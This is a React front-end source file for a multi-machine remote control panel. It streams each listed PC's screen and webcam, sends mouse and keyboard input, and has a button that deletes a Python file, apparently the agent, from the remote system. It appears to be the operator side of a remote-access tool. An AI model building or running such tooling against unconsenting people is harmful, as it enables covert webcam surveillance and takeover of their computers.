import { useEffect, useState, useRef } from "react";
import { io } from "socket.io-client";

// Ensure this matches your server URL
const socket = io("/");


export default function App() {
    const [pcList, setPcList] = useState([]);
    const [selectedPcId, setSelectedPcId] = useState(null);
    const [screen, setScreen] = useState(null);
    const [camera, setCamera] = useState(null);
    const [inputText, setInputText] = useState("");

    const imgRef = useRef(null);

    useEffect(() => {
        // Receive the list of PCs
        socket.on("update_pc_list", (list) => {
            console.log("Updated PC List:", list);
            setPcList(list);
        });

        // Receive Image Data
        socket.on("screen", (d) => setScreen("data:image/jpeg;base64," + d));
        socket.on("camera", (d) => setCamera("data:image/jpeg;base64," + d));

        return () => {
            socket.off("update_pc_list");
            socket.off("screen");
            socket.off("camera");
        };
    }, []);

    const handleSelectPc = (id) => {
        setSelectedPcId(id);
        setScreen(null); // Clear old screen
        setCamera(null);
        socket.emit("join_pc", id); // Tell server we want to watch this PC
    };

    // --- Input Handlers ---

    const handleMouseMove = (e) => {
        if (!selectedPcId || !imgRef.current) return;

        const rect = imgRef.current.getBoundingClientRect();
        const x = (e.clientX - rect.left) / rect.width;
        const y = (e.clientY - rect.top) / rect.height;

        if (x >= 0 && x <= 1 && y >= 0 && y <= 1) {
            socket.emit("remote_input", {
                targetId: selectedPcId,
                type: "mousemove",
                data: { x, y }
            });
        }
    };

    const handleClick = (e) => {
        if (!selectedPcId) return;
        e.preventDefault();
        const button = e.button === 0 ? "left" : "right";
        socket.emit("remote_input", {
            targetId: selectedPcId,
            type: "click",
            data: { button }
        });
    };

    const delete_file = () => {
        if (!selectedPcId) return;
        if (confirm("Are you sure to delete python file from system.")) {
            socket.emit("delete_file", {
                targetId: selectedPcId
            });
        }
    };


    const handleSendText = () => {
        if (!selectedPcId || !inputText) return;
        socket.emit("remote_input", {
            targetId: selectedPcId,
            type: "type",
            data: { text: inputText }
        });
        setInputText("");
    };

    const handleKey = (keyName) => {
        if (!selectedPcId) return;
        socket.emit("remote_input", {
            targetId: selectedPcId,
            type: "keypress",
            data: { key: keyName }
        });
    };

    // --- Render ---

    // 1. PC List View
    if (!selectedPcId) {
        return (
            <div style={{ padding: 20, background: "#111", minHeight: "100vh", color: "white", fontFamily: "sans-serif" }}>
                <h2>Available PCs</h2>
                <div style={{ display: "flex", gap: 15, flexWrap: "wrap" }}>
                    {pcList.length === 0 && <p style={{ color: "#888" }}>No PCs online...</p>}
                    {pcList.map((pc) => (
                        <div
                            key={pc.id}
                            onClick={() => handleSelectPc(pc.id)}
                            style={{
                                border: "1px solid #444",
                                background: "#222",
                                padding: "20px",
                                borderRadius: "8px",
                                cursor: "pointer",
                                width: "200px",
                                textAlign: "center"
                            }}
                        >
                            <h3 style={{ margin: "0 0 10px 0" }}>{pc.name}</h3>
                            <small style={{ color: "#666" }}>{pc.id.slice(0, 6)}...</small>
                        </div>
                    ))}
                </div>
            </div>
        );
    }

    // 2. Control View
    return (
        <div style={{ width: "100vw", height: "100vh", background: "#000", display: "flex", flexDirection: "column" }}>

            {/* Toolbar */}
            <div style={{ padding: 10, background: "#333", display: "flex", gap: 10 }}>
                <button onClick={() => setSelectedPcId(null)}>Back to List</button>

                <input
                    style={{ padding: "5px" }}
                    type="text"
                    value={inputText}
                    onChange={e => setInputText(e.target.value)}
                    placeholder="Type to send..."
                />
                <button onClick={handleSendText}>Send Text</button>

                <div style={{ width: 20 }}></div> {/* Spacer */}

                <button onClick={() => handleKey("enter")}>Enter</button>
                <button onClick={() => handleKey("backspace")}>Backspace</button>
                <button onClick={() => handleKey("esc")}>Esc</button>
                <button onClick={() => delete_file()}>Delete File</button>
            </div>

            {/* Screen Area */}
            <div style={{ flex: 1, position: "relative", overflow: "hidden", display: "flex", justifyContent: "center", alignItems: "center" }}>

                {screen ? (
                    <img
                        ref={imgRef}
                        src={screen}
                        onMouseMove={handleMouseMove}
                        onMouseDown={handleClick}
                        onContextMenu={(e) => { e.preventDefault(); handleClick(e); }}
                        style={{
                            maxWidth: "100%",
                            maxHeight: "100%",
                            objectFit: "contain",
                            cursor: "crosshair"
                        }}
                    />
                ) : (
                    <p style={{ color: "white" }}>Connecting to video stream...</p>
                )}

                {/* Camera Overlay (Picture-in-Picture) */}
                {camera && (
                    <img
                        src={camera}
                        style={{
                            position: "absolute",
                            bottom: 20,
                            right: 20,
                            width: 240,
                            borderRadius: 8,
                            border: "2px solid rgba(255,255,255,0.5)",
                            pointerEvents: "none"
                        }}
                    />
                )}
            </div>
        </div>
    );
}